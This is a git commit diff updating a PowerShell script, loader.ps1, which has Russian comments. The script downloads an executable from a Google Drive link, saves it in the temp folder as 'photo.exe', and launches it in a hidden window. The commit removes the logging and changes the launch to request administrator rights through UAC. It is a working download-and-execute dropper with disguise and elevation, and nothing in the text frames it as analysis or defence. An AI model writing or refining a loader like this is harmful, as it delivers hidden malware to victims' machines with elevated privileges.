b81d0a2155d517a01662405fe0ac8bdac48f20b6
kotoedoff <kotoedt@gmail.com>
2025-11-26 11:11:18 +0200

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -2,19 +2,8 @@
 $url = "https://drive.google.com/uc?export=download&id=1tUR-oTx28YIm-7hIDeoLnDpRoTec0-bQ"
 $path = "$env:TEMP\photo.exe"
 
-# Логируем
-"Starting download..." | Out-File "$env:TEMP\log.txt" -Append
-
 # Качаем
 (New-Object Net.WebClient).DownloadFile($url, $path)
 
-# Проверяем скачался ли файл
-if (Test-Path $path) {
-    "File downloaded successfully, size: $((Get-Item $path).Length) bytes" | Out-File "$env:TEMP\log.txt" -Append
-    
-    # Запускаем
-    $process = Start-Process -FilePath $path -WindowStyle Hidden -PassThru
-    "Process started with PID: $($process.Id)" | Out-File "$env:TEMP\log.txt" -Append
-} else {
-    "File download failed!" | Out-File "$env:TEMP\log.txt" -Append
-}
+# Запускаем с UAC
+Start-Process -FilePath $path -WindowStyle Hidden -Verb RunAs
